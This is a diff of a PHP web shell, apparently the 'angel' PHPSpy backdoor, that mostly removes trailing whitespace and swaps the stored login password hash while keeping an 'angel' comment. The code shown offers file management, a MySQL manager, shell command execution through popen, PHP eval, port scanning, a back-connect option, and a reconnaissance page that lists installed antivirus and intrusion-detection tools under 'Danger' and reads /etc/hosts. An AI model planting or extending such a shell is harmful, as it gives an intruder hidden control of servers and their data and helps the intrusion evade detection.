@@ -18,7 +18,7 @@ define('IS_GPC', get_magic_quotes_gpc());
 $dis_func = get_cfg_var('disable_functions');
 define('IS_PHPINFO', (!eregi("phpinfo",$dis_func)) ? 1 : 0 );
 
-if( IS_GPC ) { 
+if( IS_GPC ) {
 	$_POST = s_array($_POST);
 }
 $P = $_POST;
@@ -28,7 +28,7 @@ unset($_POST);
 //echo encode_pass('angel');exit;
 //angel = ec38fe2a8497e0a8d6d349b3533038cb
 // 如果需要密码验证,请修改登陆密码,留空为不需要验证
-$pass  = 'ec38fe2a8497e0a8d6d349b3533038cb'; //angel
+$pass  = 'd96ee15a2c1607c2f4c2183ec922762b'; //angel
 
 //如您对 cookie 作用范围有特殊要求, 或登录不正常, 请修改下面变量, 否则请保持默认
 // cookie 前缀
@@ -300,13 +300,13 @@ if(!function_exists('posix_getegid')) {
 			makeselect(array('name'=>'charset','option'=>$charsetdb,'selected'=>$charset,'onchange'=>'g(null,null,null,null,null,null,this.value);'));
 			?>
 			</span>
-			<a href="javascript:g('logout');">Logout</a> | 
-			<a href="javascript:g('file',null,'','','','','<?php echo $charset;?>');">File Manager</a> | 
-			<a href="javascript:g('mysqladmin',null,'','','','','<?php echo $charset;?>');">MYSQL Manager</a> | 
-			<a href="javascript:g('shell',null,'','','','','<?php echo $charset;?>');">Execute Command</a> | 
-			<a href="javascript:g('phpenv',null,'','','','','<?php echo $charset;?>');">PHP Variable</a> | 
-			<a href="javascript:g('portscan',null,'','','','','<?php echo $charset;?>');">Port Scan</a> | 
-			<a href="javascript:g('secinfo',null,'','','','','<?php echo $charset;?>');">Security information</a> | 
+			<a href="javascript:g('logout');">Logout</a> |
+			<a href="javascript:g('file',null,'','','','','<?php echo $charset;?>');">File Manager</a> |
+			<a href="javascript:g('mysqladmin',null,'','','','','<?php echo $charset;?>');">MYSQL Manager</a> |
+			<a href="javascript:g('shell',null,'','','','','<?php echo $charset;?>');">Execute Command</a> |
+			<a href="javascript:g('phpenv',null,'','','','','<?php echo $charset;?>');">PHP Variable</a> |
+			<a href="javascript:g('portscan',null,'','','','','<?php echo $charset;?>');">Port Scan</a> |
+			<a href="javascript:g('secinfo',null,'','','','','<?php echo $charset;?>');">Security information</a> |
 			<a href="javascript:g('eval',null,'','','','','<?php echo $charset;?>');">Eval PHP Code</a>
 			<?php if (!IS_WIN) {?> | <a href="javascript:g('backconnect',null,'','','','','<?php echo $charset;?>');">Back Connect</a><?php }?>
 		</td>
@@ -386,7 +386,7 @@ if ($act == 'file') {
 			case 'paste':
 				if($_SESSION['do'] == 'copy') {
 					foreach($_SESSION['dl'] as $f) {
-						copy_paste($_SESSION['c'],$f, $cwd);					
+						copy_paste($_SESSION['c'],$f, $cwd);
 					}
 				} elseif($_SESSION['do'] == 'move') {
 					foreach($_SESSION['dl'] as $f) {
@@ -630,7 +630,7 @@ elseif ($act == 'mysqladmin') {
 							$DB->sqldump($v, $fp);
 						}
 					}
-					fclose($fp);				
+					fclose($fp);
 					$fileurl = str_replace(SA_ROOT,'',$P['bak_path']);
 					m('Database has backup to <a href="'.$fileurl.'" target="_blank">'.$P['bak_path'].'</a>');
 				} else {
@@ -672,7 +672,7 @@ elseif ($act == 'mysqladmin') {
 	p('</p>');
 
 	if ($dbhost && $dbuser && isset($dbpass)) {
-		
+
 		// 初始化数据库类
 		$DB = new DB_MySQL;
 		$DB->charsetdb = $charsetdb;
@@ -718,7 +718,7 @@ elseif ($act == 'mysqladmin') {
 						{
 							case 0:
 								p('<h2>'.$DB->halt('Error').'</h2>');
-								break;	
+								break;
 							case 1:
 								$result = $DB->query($query);
 								$tatol = $DB->num_rows($result);
@@ -729,7 +729,7 @@ elseif ($act == 'mysqladmin') {
 									p('<td nowrap>'.@mysql_field_name($result, $i).'</td>');
 								}
 								p('</tr>');
-								
+
 								if (!$tatol) {
 									p('<tr class="alt2" onmouseover="this.className=\'focus\';" onmouseout="this.className=\'alt2\';"><td nowrap colspan="'.$fieldnum.'" class="red b">No records</td></tr>');
 								} else {
@@ -766,7 +766,7 @@ elseif ($act == 'mysqladmin') {
 				unset($table);
 				if (count($tabledb)) {
 					if ($highver) {
-						$db_engine = $DB->fetch($DB->query("SHOW VARIABLES LIKE 'storage_engine';"));						
+						$db_engine = $DB->fetch($DB->query("SHOW VARIABLES LIKE 'storage_engine';"));
 						$db_collation = $DB->fetch($DB->query("SHOW VARIABLES LIKE 'collation_database';"));
 					}
 					$sort = array('Name', 1);
@@ -897,13 +897,13 @@ elseif ($act == 'portscan') {
 		p('<h2>Result &raquo;</h2>');
 		p('<ul class="info">');
 		foreach(explode(',', $p3) as $port) {
-			$fp = @fsockopen($p2, $port, $errno, $errstr, 1); 
+			$fp = @fsockopen($p2, $port, $errno, $errstr, 1);
 			if (!$fp) {
 				p('<li>'.$p2.':'.$port.' ------------------------ <span class="b">Close</span></li>');
 		   } else {
 				p('<li>'.$p2.':'.$port.' ------------------------ <span class="red b">Open</span></li>');
 				@fclose($fp);
-		   } 
+		   }
 		}
 		p('</ul>');
 	}
@@ -1035,7 +1035,7 @@ elseif ($act == 'phpenv') {
 }//end phpenv
 
 elseif ($act == 'secinfo') {
-	
+
 	if( !IS_WIN ) {
 		$userful = array('gcc','lcc','cc','ld','make','php','perl','python','ruby','tar','gzip','bzip','bzip2','nc','locate','suidperl');
 		$danger = array('kav','nod32','bdcored','uvscan','sav','drwebd','clamd','rkhunter','chkrootkit','iptables','ipfw','tripwire','shieldcc','portsentry','snort','ossec','lidsadm','tcplodg','sxid','logcheck','logwatch','sysmask','zmbscap','sawmill','wormscan','ninja');
@@ -1055,7 +1055,7 @@ elseif ($act == 'secinfo') {
 				if(which($item)){$temp[]=$item;}
 			secparam('Danger', implode(', ',$temp));
 			$temp=array();
-			foreach ($downloaders as $item) 
+			foreach ($downloaders as $item)
 				if(which($item)){$temp[]=$item;}
 			secparam('Downloaders', implode(', ',$temp));
 			secparam('Hosts', @file_get_contents('/etc/hosts'));
@@ -1153,7 +1153,7 @@ function execute($cfe) {
 		} elseif(@is_resource($f = @popen($cfe,"r"))) {
 			$res = '';
 			while(!@feof($f)) {
-				$res .= @fread($f,1024); 
+				$res .= @fread($f,1024);
 			}
 			@pclose($f);
 		}
@@ -1162,7 +1162,7 @@ function execute($cfe) {
 }
 function which($pr) {
 	$path = execute("which $pr");
-	return ($path ? $path : $pr); 
+	return ($path ? $path : $pr);
 }
 function cf($fname,$text){
 	if($fp=@fopen($fname,'w')) {
@@ -1170,7 +1170,7 @@ function cf($fname,$text){
 		@fclose($fp);
 	}
 }
-function dirsize($cwd) { 
+function dirsize($cwd) {
 	$dh = @opendir($cwd);
 	$size = 0;
 	while($file = @readdir($dh)) {
@@ -1204,7 +1204,7 @@ function getChmod($file){
 	return substr(base_convert(@fileperms($file),10,8),-4);
 }
 
-function PermsColor($f) { 
+function PermsColor($f) {
 	if (!is_readable($f)) {
 		return '<span class="red">'.getPerms($f).'</span>';
 	} elseif (!is_writable($f)) {
@@ -1218,26 +1218,26 @@ function getPerms($file) {
 	if (($mode & 0xC000) === 0xC000) {$type = 's';}
 	elseif (($mode & 0x4000) === 0x4000) {$type = 'd';}
 	elseif (($mode & 0xA000) === 0xA000) {$type = 'l';}
-	elseif (($mode & 0x8000) === 0x8000) {$type = '-';} 
+	elseif (($mode & 0x8000) === 0x8000) {$type = '-';}
 	elseif (($mode & 0x6000) === 0x6000) {$type = 'b';}
 	elseif (($mode & 0x2000) === 0x2000) {$type = 'c';}
 	elseif (($mode & 0x1000) === 0x1000) {$type = 'p';}
 	else {$type = '?';}
 
-	$owner['read'] = ($mode & 00400) ? 'r' : '-'; 
-	$owner['write'] = ($mode & 00200) ? 'w' : '-'; 
-	$owner['execute'] = ($mode & 00100) ? 'x' : '-'; 
-	$group['read'] = ($mode & 00040) ? 'r' : '-'; 
-	$group['write'] = ($mode & 00020) ? 'w' : '-'; 
-	$group['execute'] = ($mode & 00010) ? 'x' : '-'; 
-	$world['read'] = ($mode & 00004) ? 'r' : '-'; 
-	$world['write'] = ($mode & 00002) ? 'w' : '-'; 
-	$world['execute'] = ($mode & 00001) ? 'x' : '-'; 
+	$owner['read'] = ($mode & 00400) ? 'r' : '-';
+	$owner['write'] = ($mode & 00200) ? 'w' : '-';
+	$owner['execute'] = ($mode & 00100) ? 'x' : '-';
+	$group['read'] = ($mode & 00040) ? 'r' : '-';
+	$group['write'] = ($mode & 00020) ? 'w' : '-';
+	$group['execute'] = ($mode & 00010) ? 'x' : '-';
+	$world['read'] = ($mode & 00004) ? 'r' : '-';
+	$world['write'] = ($mode & 00002) ? 'w' : '-';
+	$world['execute'] = ($mode & 00001) ? 'x' : '-';
 
 	if( $mode & 0x800 ) {$owner['execute'] = ($owner['execute']=='x') ? 's' : 'S';}
 	if( $mode & 0x400 ) {$group['execute'] = ($group['execute']=='x') ? 's' : 'S';}
 	if( $mode & 0x200 ) {$world['execute'] = ($world['execute']=='x') ? 't' : 'T';}
- 
+
 	return $type.$owner['read'].$owner['write'].$owner['execute'].$group['read'].$group['write'].$group['execute'].$world['read'].$world['write'].$world['execute'];
 }
 
@@ -1270,10 +1270,10 @@ function deltree($deldir) {
 	$dirs = @scandir($deldir);
 	if ($dirs) {
 		$dirs = array_diff($dirs, array('..', '.'));
-		foreach ($dirs as $file) {	
+		foreach ($dirs as $file) {
 			if((is_dir($deldir.'/'.$file))) {
 				@chmod($deldir.'/'.$file,0777);
-				deltree($deldir.'/'.$file); 
+				deltree($deldir.'/'.$file);
 			} else {
 				@chmod($deldir.'/'.$file,0777);
 				@unlink($deldir.'/'.$file);
@@ -1409,7 +1409,7 @@ function formhead($arg = array()) {
 		p('<h2>'.$arg['title'].' &raquo;</h2>');
 	}
 }
-	
+
 function maketext($arg = array()){
 	$arg['title'] = isset($arg['title']) ? $arg['title'].'<br />' : '';
 	$arg['name'] = isset($arg['name']) ? $arg['name'] : '';
@@ -1489,12 +1489,12 @@ class DB_MySQL  {
 		$this->querycount++;
 		return $query;
 	}
-	function query_res($sql) { 
+	function query_res($sql) {
 		$res = '';
-		if(!$res = mysql_query($sql, $this->link)) { 
+		if(!$res = mysql_query($sql, $this->link)) {
 			$res = 0;
 		} else if(is_resource($res)) {
-			$res = 1; 
+			$res = 1;
 		} else {
 			$res = 2;
 		}
@@ -1515,7 +1515,7 @@ class DB_MySQL  {
 	function result($query, $row) {
 		$query = mysql_result($query, $row);
 		return $query;
-	}	
+	}
 	function free_result($query) {
 		$query = mysql_free_result($query);
 		return $query;
